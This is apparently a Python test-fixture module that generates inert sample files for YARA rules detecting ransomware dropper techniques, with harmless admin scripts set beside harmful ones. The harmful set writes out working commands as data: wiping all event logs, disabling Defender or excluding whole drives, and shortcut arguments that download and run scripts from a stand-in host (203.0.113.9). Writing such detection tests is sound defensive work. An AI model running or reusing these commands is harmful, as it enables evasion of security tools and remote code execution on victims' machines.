"""S-Y1 to S-Y4: inert examples for the admin-command YARA rules.

HARMLESS files are what administrators and build systems write; HARMFUL files
carry the same techniques the way ransomware droppers use them. Shortcuts are
real shell-link structures (MS-SHLLINK header, link flags, Unicode string data),
generated here; programs are inert byte strings with an `MZ` start and no code.
None of these runs anything. A file in HARMLESS is not "safe because it looks
administrative": it is an example the rules should not score as an attack on
the strength of one administrative command alone."""

import struct

LINK_CLSID = bytes.fromhex("0114020000000000c000000000000046")


def shell_link(relative_path: str, arguments: str) -> bytes:
    """A minimal shell link: header, then RELATIVE_PATH and COMMAND_LINE_ARGUMENTS
    as counted UTF-16 strings (flags HasRelativePath | HasArguments | IsUnicode)."""
    flags = 0x08 | 0x20 | 0x80
    header = (struct.pack("<I", 0x4C) + LINK_CLSID + struct.pack("<II", flags, 0x20)
              + b"\x00" * 24 + struct.pack("<IiIH", 0, 0, 1, 0) + b"\x00" * 10)
    assert len(header) == 0x4C

    def counted(text: str) -> bytes:
        return struct.pack("<H", len(text)) + text.encode("utf-16le")
    return header + counted(relative_path) + counted(arguments)


def program(*strings: str) -> bytes:
    """Inert bytes shaped like a program's string table: `MZ`, then text."""
    return b"MZ" + b"\x00" * 62 + b"\x00".join(s.encode() for s in strings)


CMD = r"..\..\Windows\System32\cmd.exe"
POWERSHELL = r"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

HARMLESS = [
    ("S-Y1", "rotate_logs.ps1", b"# nightly lab reset\r\nClear-EventLog -LogName Application\r\n"),
    ("S-Y2", "build_agent_setup.ps1",
     b"# keep the build output folder out of real-time scanning\r\n"
     b"Add-MpPreference -ExclusionPath 'D:\\build\\out'\r\n"),
    ("S-Y2", "ci_cache.ps1",
     b"Add-MpPreference -ExclusionPath \"$env:AGENT_WORKFOLDER\\_cache\"\r\n"),
    ("S-Y3", "Network info.lnk", shell_link(CMD, "/c ipconfig /all & pause")),
    ("S-Y3", "Open logs.lnk", shell_link(CMD, "/c start \"\" \"%ProgramData%\\Vendor\\logs\"")),
    ("S-Y4", "backup_prefreeze.bat",
     b"@echo off\r\nrem quiesce the databases for the snapshot\r\nnet stop SQLWriter\r\n"
     b"net stop MSSQLSERVER & rem sqlservr\r\nnet stop VSS\r\nnet stop veeam.backup\r\n"
     b"net stop BackupExecAgentAccelerator\r\nnet stop MSExchangeIS\r\n"),
    ("S-Y4", "backup_agent.exe", program(
        ".docx", ".xlsx", ".pptx", ".pdf", ".jpg", ".sql", ".mdb", ".pst", ".vmdk", ".vhdx",
        ".bak", ".accdb", "BCryptEncrypt", "BCryptGenRandom", "FindFirstFileW", "FindNextFileW",
        "readme.txt", "decrypt the archive with your recovery key")),
]

HARMFUL = [
    ("S-Y1", "wipe_traces.bat", b"for /f \"tokens=*\" %%G in ('wevtutil el') do wevtutil cl \"%%G\"\r\n"),
    ("S-Y1", "clear_security.ps1", b"wevtutil cl security\r\nClear-EventLog -LogName System\r\n"),
    ("S-Y2", "disable_av.ps1", b"Set-MpPreference -DisableRealtimeMonitoring $true\r\n"),
    ("S-Y2", "exclude_drive.ps1", b"Add-MpPreference -ExclusionPath 'C:\\'\r\n"),
    ("S-Y2", "exclude_dropper.ps1",
     b"Add-MpPreference -ExclusionPath \"$env:APPDATA\\svc\"\r\n"
     b"Invoke-WebRequest http://203.0.113.9/svc.exe -OutFile \"$env:APPDATA\\svc\\svc.exe\"\r\n"),
    ("S-Y2", "exclude_ext.ps1", b"Add-MpPreference -ExclusionExtension '.exe'\r\n"),
    ("S-Y3", "Invoice.lnk", shell_link(POWERSHELL,
                                       "-w hidden -c iex(iwr http://203.0.113.9/a.ps1)")),
    ("S-Y3", "Scan.lnk", shell_link(CMD, "/c start /min mshta http://203.0.113.9/a.hta")),
    ("S-Y3", "Doc.lnk", shell_link(CMD, "/c powershell -nop -c \"& {iex $env:X}\"")),
    ("S-Y4", "kill_all.bat",
     b"taskkill /f /im sqlservr.exe\r\ntaskkill /f /im winword.exe\r\ntaskkill /f /im excel.exe\r\n"
     b"taskkill /f /im outlook.exe\r\nnet stop veeam\r\nnet stop sophos\r\n"),
    ("S-Y4", "encryptor.exe", program(
        ".docx", ".xlsx", ".pptx", ".pdf", ".jpg", ".sql", ".mdb", ".pst", ".vmdk", ".vhdx",
        ".bak", ".accdb", "CryptEncrypt", "CryptGenRandom", "FindFirstFileW", "FindNextFileW",
        "README_DECRYPT.txt", "decrypt your files", "vssadmin")),
]
